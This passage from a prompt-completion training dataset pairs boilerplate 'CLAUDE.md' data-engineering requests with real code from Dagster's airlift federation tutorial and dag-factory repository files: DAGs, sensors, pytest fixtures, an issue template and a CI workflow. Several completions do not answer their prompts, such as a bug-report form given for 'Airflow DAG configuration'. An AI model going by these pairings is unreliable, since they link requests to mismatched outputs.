= build_airflow_polling_sensor(\n    mapped_assets=[load_customers_dag_asset],\n    airflow_instance=warehouse_airflow_instance,\n)\nmetrics_sensor = build_airflow_polling_sensor(\n    mapped_assets=[customer_metrics_dag_asset],\n    airflow_instance=metrics_airflow_instance,\n)\n\ndefs = Definitions(\n    assets=[load_customers_dag_asset, customer_metrics_dag_asset],\n    sensors=[warehouse_sensor, metrics_sensor],\n)\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial/dagster_defs/stages/observe_complete.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate module integration for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from dagster import Definitions\nfrom dagster_airlift.core import (\n    AirflowBasicAuthBackend,\n    AirflowInstance,\n    build_airflow_polling_sensor,\n    load_airflow_dag_asset_specs,\n)\n\nwarehouse_airflow_instance = AirflowInstance(\n    auth_backend=AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8081\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"warehouse\",\n)\n\nmetrics_airflow_instance = AirflowInstance(\n    auth_backend=AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8082\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"metrics\",\n)\n\nload_customers_dag_asset = next(\n    iter(\n        load_airflow_dag_asset_specs(\n            airflow_instance=warehouse_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"load_customers\",\n        )\n    )\n)\ncustomer_metrics_dag_asset = next(\n    iter(\n        load_airflow_dag_asset_specs(\n            airflow_instance=metrics_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"customer_metrics\",\n        )\n    )\n    # Add a dependency on the load_customers_dag_asset\n).replace_attributes(\n    deps=[load_customers_dag_asset],\n)\n\nwarehouse_sensor = build_airflow_polling_sensor(\n    mapped_assets=[load_customers_dag_asset],\n    airflow_instance=warehouse_airflow_instance,\n)\nmetrics_sensor = build_airflow_polling_sensor(\n    mapped_assets=[customer_metrics_dag_asset],\n    airflow_instance=metrics_airflow_instance,\n)\n\ndefs = Definitions(\n    assets=[load_customers_dag_asset, customer_metrics_dag_asset],\n    sensors=[warehouse_sensor, metrics_sensor],\n)\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial/dagster_defs/stages/observe_with_deps.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nfrom datetime import datetime\nfrom typing import Union\n\nimport duckdb\nimport pandas as pd\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\nfrom airlift_federation_tutorial.constants import (\n    CUSTOMERS_DB_NAME,\n    CUSTOMERS_SCHEMA,\n    CUSTOMERS_TABLE_NAME,\n    DUCKDB_PATH,\n    METRICS_SCHEMA,\n    METRICS_TABLE_NAME,\n)\nfrom dagster._time import get_current_datetime_midnight\n\n\ndef calculate_customer_count() -> None:\n    os.environ[\"NO_PROXY\"] = \"*\"\n\n    con = duckdb.connect(str(DUCKDB_PATH))\n\n    result: Union[tuple, None] = con.execute(\n        f\"SELECT COUNT(*) FROM {CUSTOMERS_DB_NAME}.{CUSTOMERS_SCHEMA}.{CUSTOMERS_TABLE_NAME}\"\n    ).fetchone()\n    if not result:\n        raise ValueError(\"No customers found\")\n    count_df = pd.DataFrame([{\"date\": datetime.now().date(), \"total_customers\": result[0]}])  # noqa: F841 # used by duckdb\n\n    con.execute(f\"CREATE SCHEMA IF NOT EXISTS {METRICS_SCHEMA}\").fetchall()\n\n    con.execute(f\"\"\"\n        CREATE TABLE IF NOT EXISTS {CUSTOMERS_DB_NAME}.{METRICS_SCHEMA}.{METRICS_TABLE_NAME} (\n            date DATE,\n            total_customers INTEGER\n        )\n    \"\"\").fetchall()\n\n    con.execute(\n        f\"INSERT INTO {CUSTOMERS_DB_NAME}.{METRICS_SCHEMA}.{METRICS_TABLE_NAME} SELECT * FROM count_df\"\n    ).fetchall()\n\n    con.close()\n\n\nwith DAG(\n    dag_id=\"customer_metrics\",\n    is_paused_upon_creation=False,\n    start_date=get_current_datetime_midnight(),\n) as dag:\n    count_task = PythonOperator(\n        task_id=\"calculate_customer_count\",\n        python_callable=calculate_customer_count,\n        dag=dag,\n    )\n\nfor dag_id in [\"orders_metrics\", \"products_metrics\", \"payments_metrics\", \"sales_metrics\"]:\n    with DAG(\n        dag_id=dag_id,\n        is_paused_upon_creation=False,\n        start_date=get_current_datetime_midnight(),\n    ) as dag:\n        PythonOperator(\n            task_id=\"task\",\n            python_callable=lambda: None,\n            dag=dag,\n        )\n    globals()[dag_id] = dag\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial/metrics_airflow_dags/dags.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.92, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation using pandas for data manipulation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\n\nimport duckdb\nimport pandas as pd\nfrom airflow import DAG\nfrom airflow.operators.python import PythonOperator\nfrom airlift_federation_tutorial.constants import (\n    CUSTOMERS_COLS,\n    CUSTOMERS_CSV_PATH,\n    CUSTOMERS_DB_NAME,\n    CUSTOMERS_SCHEMA,\n    CUSTOMERS_TABLE_NAME,\n    DUCKDB_PATH,\n)\nfrom dagster._time import get_current_datetime_midnight\n\n\ndef load_customers() -> None:\n    # https://github.com/apache/airflow/discussions/24463\n    os.environ[\"NO_PROXY\"] = \"*\"\n    df = pd.read_csv(  # noqa: F841 # used by duckdb\n        CUSTOMERS_CSV_PATH,\n        names=CUSTOMERS_COLS,\n    )\n\n    # Connect to DuckDB and create a new table\n    con = duckdb.connect(str(DUCKDB_PATH))\n    con.execute(f\"CREATE SCHEMA IF NOT EXISTS {CUSTOMERS_SCHEMA}\").fetchall()\n    con.execute(\n        f\"CREATE TABLE IF NOT EXISTS {CUSTOMERS_DB_NAME}.{CUSTOMERS_SCHEMA}.{CUSTOMERS_TABLE_NAME} AS SELECT * FROM df\"\n    ).fetchall()\n    con.close()\n\n\nwith DAG(\n    dag_id=\"load_customers\",\n    is_paused_upon_creation=False,\n    start_date=get_current_datetime_midnight(),\n) as dag:\n    PythonOperator(\n        task_id=\"load_customers_to_warehouse\",\n        python_callable=load_customers,\n        dag=dag,\n    )\n\n# Define some dummy DAGs to simulate a big Airflow instance\nfor dag_id in [\"load_orders\", \"load_products\", \"load_payments\", \"load_sales\"]:\n    with DAG(\n        dag_id=dag_id,\n        is_paused_upon_creation=False,\n        start_date=get_current_datetime_midnight(),\n    ) as dag:\n        PythonOperator(\n            task_id=\"task\",\n            python_callable=lambda: None,\n            dag=dag,\n        )\n    globals()[dag_id] = dag\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial/warehouse_airflow_dags/dags.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.89, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import os\nimport shutil\nimport subprocess\nfrom collections.abc import Generator\nfrom contextlib import contextmanager\nfrom pathlib import Path\n\nimport pytest\nfrom dagster_airlift.core import AirflowBasicAuthBackend, AirflowInstance\nfrom dagster_airlift.test.shared_fixtures import stand_up_airflow, stand_up_dagster\n\n\ndef makefile_dir() -> Path:\n    return Path(__file__).parent.parent\n\n\ndef airflow_test_instance(port: int) -> AirflowInstance:\n    return AirflowInstance(\n        auth_backend=AirflowBasicAuthBackend(\n            webserver_url=f\"http://localhost:{port}\",\n            username=\"admin\",\n            password=\"admin\",\n        ),\n        name=\"test\",\n    )\n\n\ndef warehouse_instance() -> AirflowInstance:\n    return airflow_test_instance(8081)\n\n\ndef metrics_instance() -> AirflowInstance:\n    return airflow_test_instance(8082)\n\n\n@pytest.fixture(name=\"local_env\")\ndef local_env_fixture() -> Generator[None, None, None]:\n    try:\n        subprocess.run([\"make\", \"airflow_setup\"], cwd=makefile_dir(), check=True)\n        yield\n    finally:\n        subprocess.run([\"make\", \"wipe\"], cwd=makefile_dir(), check=True)\n\n\n@pytest.fixture(name=\"warehouse_airflow\")\ndef warehouse_airflow_fixture(local_env: None) -> Generator[subprocess.Popen, None, None]:\n    process = None\n    try:\n        with stand_up_airflow(\n            airflow_cmd=[\"make\", \"warehouse_airflow_run\"],\n            env=os.environ,\n            cwd=makefile_dir(),\n            port=8081,\n        ) as process:\n            yield process\n    finally:\n        if process:\n            process.terminate()\n\n\n@pytest.fixture(name=\"metrics_airflow\")\ndef metrics_airflow_fixture(local_env: None) -> Generator[subprocess.Popen, None, None]:\n    process = None\n    try:\n        with stand_up_airflow(\n            airflow_cmd=[\"make\", \"metrics_airflow_run\"],\n            env=os.environ,\n            cwd=makefile_dir(),\n            port=8082,\n        ) as process:\n            yield process\n    finally:\n        if process:\n            process.terminate()\n\n\n@pytest.fixture(name=\"dagster_dev\")\ndef dagster_fixture(\n    warehouse_airflow: subprocess.Popen, metrics_airflow: subprocess.Popen\n) -> Generator[subprocess.Popen, None, None]:\n    process = None\n    try:\n        with stand_up_dagster(\n            dagster_dev_cmd=[\"make\", \"-C\", str(makefile_dir()), \"dagster_run\"],\n            port=3000,\n        ) as process:\n            yield process\n    finally:\n        if process:\n            process.terminate()\n\n\n@contextmanager\ndef replace_file(old_file: Path, new_file: Path) -> Generator[None, None, None]:\n    backup_file = old_file.with_suffix(old_file.suffix + \".bak\")\n    try:\n        if old_file.exists():\n            shutil.copy2(old_file, backup_file)\n        if new_file.exists():\n            shutil.copy2(new_file, old_file)\n        else:\n            raise FileNotFoundError(f\"New file {new_file} not found\")\n        yield\n    finally:\n        if backup_file.exists():\n            shutil.copy2(backup_file, old_file)\n            backup_file.unlink()\n\n\nORIG_DEFS_FILE = makefile_dir() / \"airlift_federation_tutorial\" / \"dagster_defs\" / \"definitions.py\"\nSNIPPETS_DIR = makefile_dir() / \"snippets\"\n\n\ndef assert_successful_dag_run(af_instance: AirflowInstance, dag_id: str) -> None:\n    run_id = af_instance.trigger_dag(dag_id)\n    assert run_id is not None\n    af_instance.wait_for_run_completion(dag_id=dag_id, run_id=run_id)\n    assert af_instance.get_run_state(dag_id=dag_id, run_id=run_id) == \"success\"\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial_tests/conftest.py", "language": "python", "complexity": "medium", "star_count": 13638, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import subprocess\nfrom collections.abc import Generator\n\nimport pytest\nimport requests\nfrom airlift_federation_tutorial_tests.conftest import ORIG_DEFS_FILE, makefile_dir, replace_file\nfrom dagster_airlift.in_airflow.gql_queries import ASSET_NODES_QUERY\nfrom dagster_airlift.test.shared_fixtures import stand_up_dagster\n\nEXECUTABLE_STAGE_FILE = ORIG_DEFS_FILE.parent / \"stages\" / \"executable_and_da.py\"\n\n\n@pytest.fixture\ndef completed_stage() -> Generator[None, None, None]:\n    with replace_file(ORIG_DEFS_FILE, EXECUTABLE_STAGE_FILE):\n        yield\n\n\n@pytest.fixture(name=\"dagster_dev\")\ndef dagster_fixture(\n    warehouse_airflow: subprocess.Popen, metrics_airflow: subprocess.Popen, completed_stage: None\n) -> Generator[subprocess.Popen, None, None]:\n    process = None\n    try:\n        with stand_up_dagster(\n            dagster_dev_cmd=[\"make\", \"-C\", str(makefile_dir()), \"dagster_run\"],\n            port=3000,\n        ) as process:\n            yield process\n    finally:\n        if process:\n            process.terminate()\n\n\ndef test_executable_stage(dagster_dev: subprocess.Popen) -> None:\n    response = requests.post(\n        # Timeout in seconds\n        \"http://localhost:3000/graphql\",\n        json={\"query\": ASSET_NODES_QUERY},\n        timeout=3,\n    )\n    assert response.status_code == 200\n    assert len(response.json()[\"data\"][\"assetNodes\"]) == 2\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial_tests/test_executable_stage.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import subprocess\n\nimport requests\nfrom airlift_federation_tutorial_tests.conftest import (\n    assert_successful_dag_run,\n    metrics_instance,\n    warehouse_instance,\n)\nfrom dagster_airlift.in_airflow.gql_queries import VERIFICATION_QUERY\n\n\ndef test_load_warehouse(warehouse_airflow: subprocess.Popen) -> None:\n    af_instance = warehouse_instance()\n    assert len(af_instance.list_dags()) == 5\n    assert_successful_dag_run(af_instance, \"load_customers\")\n\n\ndef test_load_metrics(metrics_airflow: subprocess.Popen) -> None:\n    assert len(metrics_instance().list_dags()) == 5\n    assert_successful_dag_run(metrics_instance(), \"customer_metrics\")\n\n\ndef test_load_dagster(dagster_dev: subprocess.Popen) -> None:\n    response = requests.post(\n        # Timeout in seconds\n        \"http://localhost:3000/graphql\",\n        json={\"query\": VERIFICATION_QUERY},\n        timeout=3,\n    )\n    assert response.status_code == 200\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial_tests/test_instances.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import subprocess\n\nimport requests\nfrom airlift_federation_tutorial_tests.conftest import (\n    assert_successful_dag_run,\n    metrics_instance,\n    warehouse_instance,\n)\nfrom dagster_airlift.in_airflow.gql_queries import VERIFICATION_QUERY\n\n\ndef test_load_warehouse(warehouse_airflow: subprocess.Popen) -> None:\n    af_instance = warehouse_instance()\n    assert len(af_instance.list_dags()) == 5\n    assert_successful_dag_run(af_instance, \"load_customers\")\n\n\ndef test_load_metrics(metrics_airflow: subprocess.Popen) -> None:\n    assert len(metrics_instance().list_dags()) == 5\n    assert_successful_dag_run(metrics_instance(), \"customer_metrics\")\n\n\ndef test_load_dagster(dagster_dev: subprocess.Popen) -> None:\n    response = requests.post(\n        # Timeout in seconds\n        \"http://localhost:3000/graphql\",\n        json={\"query\": VERIFICATION_QUERY},\n        timeout=3,\n    )\n    assert response.status_code == 200\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial_tests/test_load.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.9500000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import subprocess\nfrom collections.abc import Generator\nfrom pathlib import Path\n\nimport pytest\nimport requests\nfrom airlift_federation_tutorial_tests.conftest import (\n    ORIG_DEFS_FILE,\n    SNIPPETS_DIR,\n    makefile_dir,\n    replace_file,\n)\nfrom dagster_airlift.in_airflow.gql_queries import ASSET_NODES_QUERY\nfrom dagster_airlift.test.shared_fixtures import stand_up_dagster\n\nOBSERVE_COMPLETE_FILE = ORIG_DEFS_FILE.parent / \"stages\" / \"observe_complete.py\"\nOBSERVE_WITH_DEPS_FILE = ORIG_DEFS_FILE.parent / \"stages\" / \"observe_with_deps.py\"\nOBSERVE_SNIPPETS_FILE = SNIPPETS_DIR / \"observe.py\"\nEXECUTABLE_AND_DA_FILE = ORIG_DEFS_FILE.parent / \"stages\" / \"executable_and_da.py\"\nFEDERATED_EXECUTION_SNIPPETS_FILE = SNIPPETS_DIR / \"federated_execution.py\"\n\n\n@pytest.fixture\ndef stage_file(request: pytest.FixtureRequest) -> Path:\n    return request.param\n\n\n@pytest.fixture\ndef simulate_stage(stage_file: Path) -> Generator[None, None, None]:\n    with replace_file(ORIG_DEFS_FILE, stage_file):\n        yield\n\n\n@pytest.fixture(name=\"dagster_dev\")\ndef dagster_fixture(\n    warehouse_airflow: subprocess.Popen, metrics_airflow: subprocess.Popen, simulate_stage: None\n) -> Generator[subprocess.Popen, None, None]:\n    process = None\n    try:\n        with stand_up_dagster(\n            dagster_dev_cmd=[\"make\", \"-C\", str(makefile_dir()), \"dagster_run\"],\n            port=3000,\n        ) as process:\n            yield process\n    finally:\n        if process:\n            process.terminate()\n\n\n@pytest.mark.parametrize(\n    \"stage_file\",\n    [\n        OBSERVE_COMPLETE_FILE,\n        OBSERVE_WITH_DEPS_FILE,\n        OBSERVE_SNIPPETS_FILE,\n        FEDERATED_EXECUTION_SNIPPETS_FILE,\n        EXECUTABLE_AND_DA_FILE,\n    ],\n    indirect=True,\n)\ndef test_stage(dagster_dev: subprocess.Popen, stage_file: Path) -> None:\n    response = requests.post(\n        # Timeout in seconds\n        \"http://localhost:3000/graphql\",\n        json={\"query\": ASSET_NODES_QUERY},\n        timeout=3,\n    )\n    assert response.status_code == 200\n    assert len(response.json()[\"data\"][\"assetNodes\"]) > 0\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/airlift_federation_tutorial_tests/test_stage.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 1.0, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import dagster as dg\nimport dagster_airlift.core as dg_airlift_core\n\nwarehouse_airflow_instance = dg_airlift_core.AirflowInstance(\n    auth_backend=dg_airlift_core.AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8081\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"warehouse\",\n)\n\nmetrics_airflow_instance = dg_airlift_core.AirflowInstance(\n    auth_backend=dg_airlift_core.AirflowBasicAuthBackend(\n        webserver_url=\"http://localhost:8082\",\n        username=\"admin\",\n        password=\"admin\",\n    ),\n    name=\"metrics\",\n)\n\nload_customers_dag_asset = next(\n    iter(\n        dg_airlift_core.load_airflow_dag_asset_specs(\n            airflow_instance=warehouse_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"load_customers\",\n        )\n    )\n)\ncustomer_metrics_dag_asset = next(\n    iter(\n        dg_airlift_core.load_airflow_dag_asset_specs(\n            airflow_instance=metrics_airflow_instance,\n            dag_selector_fn=lambda dag: dag.dag_id == \"customer_metrics\",\n        )\n    )\n).replace_attributes(\n    deps=[load_customers_dag_asset],\n    automation_condition=dg.AutomationCondition.eager(),\n)\n\nwarehouse_sensor = dg_airlift_core.build_airflow_polling_sensor(\n    mapped_assets=[load_customers_dag_asset],\n    airflow_instance=warehouse_airflow_instance,\n)\nmetrics_sensor = dg_airlift_core.build_airflow_polling_sensor(\n    mapped_assets=[customer_metrics_dag_asset],\n    airflow_instance=metrics_airflow_instance,\n)\n\n\n# start_multi_asset\n@dg.multi_asset(specs=[customer_metrics_dag_asset])\ndef run_customer_metrics() -> dg.MaterializeResult:\n    run_id = metrics_airflow_instance.trigger_dag(\"customer_metrics\")\n    metrics_airflow_instance.wait_for_run_completion(\"customer_metrics\", run_id)\n    if metrics_airflow_instance.get_run_state(\"customer_metrics\", run_id) == \"success\":\n        return dg.MaterializeResult(asset_key=customer_metrics_dag_asset.key)\n    else:\n        raise Exception(\"Dag run failed.\")\n\n\n# end_multi_asset\n\n# start_multi_asset_defs\ndefs = dg.Definitions(\n    assets=[load_customers_dag_asset, run_customer_metrics],\n    sensors=[warehouse_sensor, metrics_sensor],\n)\n# end_multi_asset_defs\n\n# start_eager\ncustomer_metrics_dag_asset = customer_metrics_dag_asset.replace_attributes(\n    automation_condition=dg.AutomationCondition.eager(),\n)\n# end_eager\n\n# start_automation_sensor\nautomation_sensor = dg.AutomationConditionSensorDefinition(\n    name=\"automation_sensor\",\n    target=\"*\",\n    default_status=dg.DefaultSensorStatus.RUNNING,\n    minimum_interval_seconds=1,\n)\n# end_automation_sensor\n\n# start_complete_defs\ndefs = dg.Definitions(\n    assets=[load_customers_dag_asset, run_customer_metrics],\n    sensors=[warehouse_sensor, metrics_sensor, automation_sensor],\n)\n# end_complete_defs\n", "metadata": {"source": "github.com/dagster-io/dagster", "file_path": "examples/airlift-federation-tutorial/snippets/federated_execution.py", "language": "python", "complexity": "simple", "star_count": 13638, "quality_score": 0.8600000000000001, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "---\nname: Bug Report\ndescription: File a bug report.\ntitle: \"[Bug] \"\nlabels: [\"bug\", \"triage-needed\"]\nbody:\n  - type: markdown\n    attributes:\n      value: |\n        Thanks for taking the time to fill out this bug report!\n  - type: input\n    id: dag-factory-version\n    attributes:\n      label: DAG Factory version\n      # yamllint disable rule:line-length\n      description: >\n        On what version of DAG Factory are you currently experiencing the issue? Remember, you are encouraged to\n        test with the latest release or on the main branch to verify your issue still exists.\n      placeholder: e.g. 0.19.0\n    validations:\n      required: true\n  - type: input\n    id: airflow-version\n    attributes:\n      label: airflow version\n      description: What version of Apache Airflow are you running?\n      placeholder: ex. 2.9.0\n    validations:\n      required: true\n  - type: input\n    id: python-version\n    attributes:\n      label: Python version\n      description: What version of Python are you running?\n      placeholder: e.g. 3.10\n    validations:\n      required: true\n  - type: dropdown\n    attributes:\n      label: Deployment\n      description: >\n        What kind of deployment do you have?\n      multiple: false\n      options:\n        - \"Official Apache Airflow Helm Chart\"\n        - \"Other 3rd-party Helm chart\"\n        - \"Docker-Compose\"\n        - \"Other Docker-based deployment\"\n        - \"Virtualenv installation\"\n        - \"Astronomer\"\n        - \"Google Cloud Composer\"\n        - \"Amazon (AWS) MWAA\"\n        - \"Microsoft ADF Managed Airflow\"\n        - \"Other\"\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Deployment details\n      description: Additional description of your deployment.\n      placeholder: >\n        Enter any relevant details of your deployment. Especially version of your tools,\n        software (docker-compose, helm, k8s, etc.), any customisation and configuration you added.\n  - type: textarea\n    id: what-happened\n    attributes:\n      label: What happened?\n      description: Also tell us, what did you expect to happen?\n      placeholder: Tell us what you see!\n      value: \"A bug happened!\"\n    validations:\n      required: true\n  - type: textarea\n    id: logs\n    attributes:\n      label: Relevant log output\n      description: Please copy and paste any relevant log output. This will be automatically formatted into code, so no need for backticks.\n      render: shell\n  - type: textarea\n    attributes:\n      label: How to reproduce\n      description: What should we do to reproduce the problem?\n      placeholder: >\n        Please make sure you provide a reproducible step-by-step case of how to reproduce the problem\n        as minimally and precisely as possible. Keep in mind we do not have access to your cluster or DAGs.\n        Remember that non-reproducible issues make it hard for us to help you or resolve the issue!\n    validations:\n      required: true\n  - type: textarea\n    attributes:\n      label: Anything else :)?\n      description: Anything else we need to know?\n      placeholder: >\n        How often does this problem occur? (Once? Every time? Only when certain conditions are met?)\n  - type: checkboxes\n    attributes:\n      label: Are you willing to submit PR?\n      description: >\n        This is absolutely not required, but we are happy to guide you in the contribution process\n        especially if you already have a good understanding of how to implement the fix. We love to bring new\n        contributors in.\n      options:\n        - label: Yes I am willing to submit a PR!\n  - type: input\n    id: contact\n    attributes:\n      label: Contact Details\n      description: (Optional) How can we get in touch with you if we need more info?\n      placeholder: ex. email@example.com\n    validations:\n      required: false\n  - type: markdown\n    attributes:\n      value: \"Thanks for completing our form!\"\n", "metadata": {"source": "github.com/astronomer/dag-factory", "file_path": ".github/ISSUE_TEMPLATE/01-bug.yml", "language": "yaml", "complexity": "medium", "star_count": 1326, "quality_score": 0.63, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate configuration for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: CI jobs\n\non:\n  # run on pushes to the default branch\n  push:\n    branches: [main]\n  # run on pull requests originated from forks based on the `main` branch.\n  # note that if you're trying to edit the CI in a pull request,\n  # your changes won't run here. you need to temporarily add your branch to\n  # the `branches` list above.\n  pull_request:\n    branches: [main]\n  # run on releases\n  release:\n    types: [\"published\"]\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}\n  cancel-in-progress: true\n\njobs:\n  Authorize:\n    environment: ${{ github.event_name == 'pull_request' &&\n      github.event.pull_request.head.repo.full_name != github.repository &&\n      'external' || 'internal' }}\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - run: true\n\n  Static-Check:\n    needs: Authorize\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha || github.ref }}\n          persist-credentials: false\n\n      - name: Install uv\n        uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc # v6.4.3\n        with:\n          version: \"0.7.12\"\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.12\"\n          architecture: \"x64\"\n\n      - run: uv tool install hatch\n      - run: hatch run tests.py3.12-2.10:static-check\n\n  Run-Unit-Tests:\n    needs: Authorize\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.9\", \"3.10\", \"3.11\", \"3.12\"]\n        airflow-version:\n          [\"2.4\", \"2.5\", \"2.6\", \"2.7\", \"2.8\", \"2.9\", \"2.10\", \"2.11\", \"3.0\"]\n        exclude:\n          - python-version: \"3.11\"\n            airflow-version: \"2.4\"\n          - python-version: \"3.11\"\n            airflow-version: \"2.5\"\n          - python-version: \"3.11\"\n            airflow-version: \"2.6\"\n          # Apache Airflow versions prior to 2.9.0 have not been tested with Python 3.12.\n          # Official support for Python 3.12 and the corresponding constraints.txt are available only for Apache Airflow >= 2.9.0.\n          # See: https://github.com/apache/airflow/tree/2.9.0?tab=readme-ov-file#requirements\n          # See: https://github.com/apache/airflow/tree/2.8.4?tab=readme-ov-file#requirements\n          - python-version: \"3.12\"\n            airflow-version: \"2.4\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.5\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.6\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.7\"\n          - python-version: \"3.12\"\n            airflow-version: \"2.8\"\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: ${{ github.event.pull_request.head.sha || github.ref }}\n          persist-credentials: false\n\n      - uses: actions/cache@v4\n        with:\n          path: |\n            ~/.cache/uv\n            ~/.cache/pip\n            .local/share/hatch/\n          key: unit-${{ runner.os }}-${{ matrix.python-version }}-${{ matrix.airflow-version }}-${{ hashFiles('pyproject.toml') }}-${{ hashFiles('dagfactory/__init__.py') }}\n\n      - name: Install uv\n        uses: astral-sh/setup-uv@e92bafb6253dcd438e0484186d7669ea7a8ca1cc # v6.4.3\n        with:\n          version: \"0.7.12\"\n\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v5\n        with:\n          python-version: ${{ matrix.python-version }}\n\n      - name: Install packages and dependencies\n        run: |\n          uv tool install hatch\n          hatch -e tests.py${{ matrix.python-version }}-${{ matrix.airflow-version }} run pip freeze\n\n      - name: Test DAG Factory against Airflow ${{ matrix.airflow-version }} and Python 